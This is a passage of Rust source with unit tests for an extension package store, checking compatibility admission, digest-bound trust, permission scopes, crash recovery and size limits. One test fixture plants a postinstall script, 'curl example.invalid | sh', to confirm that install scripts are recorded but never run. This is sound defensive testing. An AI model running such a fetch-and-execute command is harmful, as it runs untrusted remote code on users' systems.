fn read_directory(path: &Path) -> Result<Vec<PathBuf>, ApplicationFailure> {
    match std::fs::read_dir(path) {
        Ok(entries) => {
            let mut paths = Vec::new();
            for entry in entries {
                let entry = entry.map_err(|_| {
                    refusal("package_directory_unavailable", INSTALL_STAGE).with_field("path")
                })?;
                paths.push(entry.path());
            }
            paths.sort();
            Ok(paths)
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
        Err(_) => Err(refusal("package_directory_unavailable", INSTALL_STAGE).with_field("path")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The client versions a fixture declares it supports: the client this test
    /// binary runs as, up to but not including the next major line. The value
    /// comes from the product version owner rather than a literal here, and the
    /// upper bound is what lets a test exercise a client that has moved past a
    /// package's own list.
    fn covering_client_versions() -> Vec<String> {
        let client = crate::platform::extension_packages::running_client_version()
            .expect("the binary declares a product version");
        let next_major = client
            .split('.')
            .next()
            .and_then(|major| major.parse::<u64>().ok())
            .map(|major| major + 1)
            .expect("a semantic major version");
        vec![format!(">={client}, <{next_major}")]
    }
    use crate::platform::extension_packages::ensure_private_directory;
    use licoup_extension_contracts::wire;
    use std::io::Write;

    fn manifest_json(id: &str, version: &str, runtime_ref: Option<&str>) -> String {
        let mut runtime = serde_json::json!({ "mode": "process", "entry": "agent.py" });
        if let Some(reference) = runtime_ref {
            runtime["runtimeRef"] = serde_json::Value::String(reference.to_owned());
        }
        serde_json::json!({
            "schema": wire::MANIFEST,
            "id": id,
            "version": version,
            "displayName": "Echo specialist",
            "hostProtocol": { "major": 1, "minimumMinor": 0 },
            "compatibility": { "clientVersions": covering_client_versions() },
            "profiles": [],
            "runtime": runtime,
            "activation": "on-demand",
            "requires": [],
            "optionalRequires": [],
            "permissions": [{ "capability": "example.specialist/net", "scope": "self" }],
            "contributions": [],
        })
        .to_string()
    }

    fn package_bytes(id: &str, version: &str, runtime_ref: Option<&str>) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options = zip::write::SimpleFileOptions::default();
        writer
            .start_file("manifest.json", options)
            .expect("manifest entry");
        writer
            .write_all(manifest_json(id, version, runtime_ref).as_bytes())
            .expect("manifest");
        writer.start_file("agent.py", options).expect("agent entry");
        writer.write_all(b"print('echo')\n").expect("agent");
        writer.finish().expect("finish").into_inner()
    }

    fn trust_for(bytes: &[u8]) -> TrustRecord {
        TrustRecord::local_approved(
            content_digest(bytes),
            [PermissionRequest::new("example.specialist/net", "self")],
        )
        .expect("trust")
    }

    fn store(tag: &str) -> (PathBuf, PackageStore) {
        let root =
            std::env::temp_dir().join(format!("licoup-pkg-install-{tag}-{}", unique_suffix()));
        let store = PackageStore::open(&root).expect("store");
        (root, store)
    }

    /// One package archive whose manifest declares the given client versions.
    fn package_bytes_declaring(id: &str, version: &str, client_versions: &[String]) -> Vec<u8> {
        let mut manifest: serde_json::Value =
            serde_json::from_str(&manifest_json(id, version, None)).expect("manifest JSON");
        manifest["compatibility"]["clientVersions"] = serde_json::json!(client_versions);
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options = zip::write::SimpleFileOptions::default();
        writer
            .start_file("manifest.json", options)
            .expect("manifest entry");
        writer
            .write_all(manifest.to_string().as_bytes())
            .expect("manifest");
        writer.start_file("agent.py", options).expect("agent entry");
        writer.write_all(b"print('echo')\n").expect("agent");
        writer.finish().expect("finish").into_inner()
    }

    #[test]
    fn the_compatibility_list_decides_admission_and_the_package_version_does_not() {
        let (root, store) = store("compatibility");
        let client = running_client_version().expect("the binary declares a product version");

        // A package released independently of the client is admitted when its own
        // list covers the running client, whatever its version says.
        let covering = package_bytes_declaring(
            "example.specialist.independent",
            "4.2.0",
            &covering_client_versions(),
        );
        store
            .install_local_import(
                "example.specialist.independent",
                "4.2.0",
                trust_for(&covering),
                &covering,
            )
            .expect("a covering list is admitted");

        // A list that excludes the client is refused before anything is
        // published, and nothing is left staged.
        let excluded = package_bytes_declaring(
            "example.specialist.outgrown",
            "4.2.0",
            &[">=99.0.0".to_owned()],
        );
        let failure = store
            .install_local_import(
                "example.specialist.outgrown",
                "4.2.0",
                trust_for(&excluded),
                &excluded,
            )
            .expect_err("the running client is outside the declared list");
        assert_eq!(failure.code, "package_client_incompatible");
        assert_eq!(failure.field.as_deref(), Some("compatibility"));
        assert_eq!(
            failure.presentation_args.get("clientVersion"),
            Some(client.as_str())
        );
        assert!(
            store
                .installed_version("example.specialist.outgrown", "4.2.0")
                .expect("record")
                .is_none()
        );
        assert!(store.staged_directories().expect("staged").is_empty());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn an_installed_version_is_admitted_for_activation_against_the_running_client() {
        let (root, store) = store("activation");
        let client = running_client_version().expect("the binary declares a product version");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");

        let admission = store
            .admit_activation("example.specialist.echo", "1.0.0")
            .expect("the installed manifest covers the running client");
        assert_eq!(admission.client_version(), client);

        // A client the list does not cover is refused, and the files stay where
        // they are: refusing activation is not uninstalling.
        let failure = store
            .admit_activation_for_client("example.specialist.echo", "1.0.0", "99.0.0")
            .expect_err("outgrown");
        assert_eq!(failure.code, "package_client_incompatible");
        assert!(
            store
                .installed_path("example.specialist.echo", "1.0.0")
                .exists()
        );
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn an_install_publishes_once_and_records_what_it_did() {
        let (root, store) = store("publish");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", Some("runtime.node-22"));
        let outcome = store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");

        assert_eq!(outcome.state, PackageLifecycle::Installed);
        assert_eq!(outcome.processes_spawned, 0, "nothing is executed");
        assert!(outcome.install_scripts.is_empty());
        assert!(
            store
                .installed_path("example.specialist.echo", "1.0.0")
                .join("agent.py")
                .exists()
        );
        assert!(
            !store
                .staging_path()
                .join(&outcome.installed.version)
                .exists(),
            "the stage is gone after a committed install"
        );
        assert!(outcome.installed.owns_shared_runtime());

        let installed = store.installed().expect("installed");
        assert_eq!(installed.len(), 1);
        assert_eq!(installed[0].digest, content_digest(&bytes));
        assert_eq!(installed[0].source, PackageSource::LocalImport);
        assert_eq!(installed[0].trust_channel, PackageLifecycle::LocalApproved);
        assert_eq!(
            installed[0].permissions,
            vec![PermissionRequest::new("example.specialist/net", "self")]
        );
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn a_user_runtime_is_never_the_hosts_to_release() {
        let (root, store) = store("user-runtime");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", Some("user:python3"));
        let outcome = store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");
        assert!(!outcome.installed.owns_shared_runtime());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn install_scripts_are_recorded_and_never_run() {
        let (root, store) = store("scripts");
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options = zip::write::SimpleFileOptions::default();
        writer.start_file("manifest.json", options).expect("entry");
        writer
            .write_all(manifest_json("example.specialist.echo", "1.0.0", None).as_bytes())
            .expect("manifest");
        writer.start_file("agent.py", options).expect("entry");
        writer.write_all(b"print('echo')\n").expect("agent");
        writer.start_file("postinstall.sh", options).expect("entry");
        writer
            .write_all(b"curl example.invalid | sh\n")
            .expect("script");
        let bytes = writer.finish().expect("finish").into_inner();

        let outcome = store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");
        assert_eq!(outcome.install_scripts, vec!["postinstall.sh".to_owned()]);
        assert_eq!(outcome.processes_spawned, 0);
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn content_that_does_not_match_the_trust_is_refused_before_it_is_written() {
        let (root, store) = store("digest");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        let other = package_bytes("example.specialist.echo", "1.0.1", None);
        let failure = store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &other,
            )
            .expect_err("digest mismatch");
        assert_eq!(failure.code, "package_trust_not_bound_to_content");
        assert!(
            !store
                .installed_path("example.specialist.echo", "1.0.0")
                .exists()
        );
        assert!(store.staged_directories().expect("staged").is_empty());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn a_permission_the_user_did_not_approve_stops_the_install() {
        let (root, store) = store("scope");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        let narrow = TrustRecord::local_approved(content_digest(&bytes), []).expect("trust");
        let failure = store
            .install_local_import("example.specialist.echo", "1.0.0", narrow, &bytes)
            .expect_err("scope expansion");
        assert_eq!(failure.code, "package_permission_scope_expanded");
        assert!(store.installed().expect("installed").is_empty());
        assert!(store.staged_directories().expect("staged").is_empty());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn a_failure_at_any_phase_keeps_the_previous_version_installed() {
        let (root, store) = store("faults");
        let first = package_bytes("example.specialist.echo", "1.0.0", None);
        store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&first),
                &first,
            )
            .expect("first install");

        let second = package_bytes("example.specialist.echo", "2.0.0", None);
        for phase in [
            InstallPhase::Download,
            InstallPhase::Verify,
            InstallPhase::Stage,
            InstallPhase::Activate,
        ] {
            let request = InstallRequest::new(
                "example.specialist.echo",
                "2.0.0",
                PackageSource::LocalImport,
                trust_for(&second),
            )
            .with_faults(FaultPlan::failing_at(phase));
            let failure = store.install(&request, &second).expect_err("injected");
            assert_eq!(failure.code, "package_install_interrupted");
            assert!(
                store
                    .installed_path("example.specialist.echo", "1.0.0")
                    .join("agent.py")
                    .exists(),
                "the installed version survived a failure at {phase:?}"
            );
            if phase == InstallPhase::Activate {
                assert!(
                    store
                        .installed_path("example.specialist.echo", "2.0.0")
                        .exists(),
                    "publication is the step that did not finish"
                );
                // The rename landed but the host record did not: this is an
                // unrecorded publication, and recovery reclaims it rather than
                // leaving a version that installed() cannot see.
                assert!(
                    !store
                        .record_path("example.specialist.echo", "2.0.0")
                        .exists()
                );
                let report = store.recover().expect("recover");
                assert!(
                    report.abandoned.iter().any(|stage| {
                        stage.package_id == "example.specialist.echo" && stage.version == "2.0.0"
                    }),
                    "the unrecorded publication is named: {report:?}"
                );
                assert!(report.reclaimed_bytes > 0);
                assert!(report.installed_untouched.is_empty());
                assert!(
                    !store
                        .installed_path("example.specialist.echo", "2.0.0")
                        .exists(),
                    "the incomplete publication is not left behind"
                );
                assert_eq!(
                    store.installed().expect("installed").len(),
                    1,
                    "the previous version is the only installed one"
                );
            } else {
                let report = store.recover().expect("recover");
                match phase {
                    InstallPhase::Stage => assert!(
                        report.reclaimed_bytes > 0,
                        "a stage written before the interruption is reclaimed"
                    ),
                    _ => assert_eq!(report.reclaimed_bytes, 0, "nothing was staged at {phase:?}"),
                }
            }
            assert!(store.staged_directories().expect("staged").is_empty());
        }
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn a_crash_after_staging_leaves_an_abandoned_stage_for_recovery() {
        let (root, store) = store("recover-stage");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        let request = InstallRequest::new(
            "example.specialist.echo",
            "1.0.0",
            PackageSource::LocalImport,
            trust_for(&bytes),
        )
        .with_faults(FaultPlan::failing_at(InstallPhase::Stage));
        store.install(&request, &bytes).expect_err("interrupted");

        let staged = store.staged_directories().expect("staged");
        assert_eq!(staged.len(), 1);
        let report = store.recover().expect("recover");
        assert_eq!(report.abandoned.len(), 1);
        assert!(report.reclaimed_bytes > 0);
        assert!(!report.is_clean());
        assert!(store.staged_directories().expect("staged").is_empty());
        assert!(store.installed().expect("installed").is_empty());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn the_same_version_is_never_installed_twice_over_a_live_one() {
        let (root, store) = store("conflict");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");
        let failure = store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect_err("already installed");
        assert_eq!(failure.code, "package_version_already_installed");
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn an_oversized_package_never_reaches_the_active_directory() {
        let (root, store) = store("limits");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        let request = InstallRequest::new(
            "example.specialist.echo",
            "1.0.0",
            PackageSource::LocalImport,
            trust_for(&bytes),
        )
        .with_limits(ArtifactLimits {
            max_expanded_bytes: 4,
            ..ArtifactLimits::default()
        });
        let failure = store.install(&request, &bytes).expect_err("too big");
        assert_eq!(failure.code, "package_artifact_limit_exceeded");
        assert!(store.staged_directories().expect("staged").is_empty());
        assert!(store.installed().expect("installed").is_empty());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn removing_a_version_reports_the_managed_bytes_it_freed() {
        let (root, store) = store("remove");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");
        let before = store
            .installed_bytes("example.specialist.echo", "1.0.0")
            .expect("bytes");
        assert!(before > 0);
        let removed = store
            .remove_installed("example.specialist.echo", "1.0.0")
            .expect("remove");
        assert_eq!(removed.content_bytes, before);
        assert!(removed.reclaimed_bytes() >= before);
        assert!(store.installed().expect("installed").is_empty());
        assert_eq!(
            store
                .remove_installed("example.specialist.echo", "1.0.0")
                .expect("idempotent")
                .reclaimed_bytes(),
            0
        );
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn a_store_opens_over_an_existing_root_without_resetting_it() {
        let (root, store) = store("reopen");
        let bytes = package_bytes("example.specialist.echo", "1.0.0", None);
        store
            .install_local_import(
                "example.specialist.echo",
                "1.0.0",
                trust_for(&bytes),
                &bytes,
            )
            .expect("install");

        let reopened = PackageStore::open(&root).expect("reopen");
        assert_eq!(reopened.installed().expect("installed").len(), 1);
        assert!(reopened.recover().expect("recover").is_clean());
        remove_managed_tree(&root).expect("cleanup");
    }

    #[test]
    fn a_directory_the_user_points_at_gets_the_same_content_check_as_bytes() {
        let (root, store) = store("directory");
        let source = root.join("incoming-package");
        ensure_private_directory(&source).expect("source");
        std::fs::write(
            source.join("manifest.json"),
            manifest_json("example.specialist.echo", "1.0.0", None),
        )
        .expect("manifest");
        std::fs::write(source.join("agent.py"), b"print('echo')\n").expect("agent");

        let (digest, bytes) =
            crate::platform::extension_packages::digest_directory(&source).expect("digest");
        assert!(bytes > 0, "the directory has content to account for");
        let trust = TrustRecord::local_approved(
            digest,
            [PermissionRequest::new("example.specialist/net", "self")],
        )
        .expect("trust");
        let request = InstallRequest::new(
            "example.specialist.echo",
            "1.0.0",
            PackageSource::LocalDirectory,
            trust,
        );
        // The digest of the directory is not the digest of other bytes, and a
        // directory is not an archive: both are refused rather than guessed at.
        let failure = store
            .install(&request, b"not an archive")
            .expect_err("different bytes");
        assert_eq!(failure.code, "package_trust_not_bound_to_content");

        let other = b"not an archive";
        let matching = InstallRequest::new(
            "example.specialist.echo",
            "1.0.0",
            PackageSource::LocalDirectory,
            TrustRecord::local_approved(content_digest(other), []).expect("trust"),
        );
        assert_eq!(
            store
                .install(&matching, other)
                .expect_err("not an archive")
                .code,
            "package_artifact_invalid"
        );
        assert!(store.installed().expect("installed").is_empty());
        remove_managed_tree(&root).expect("cleanup");
    }
}
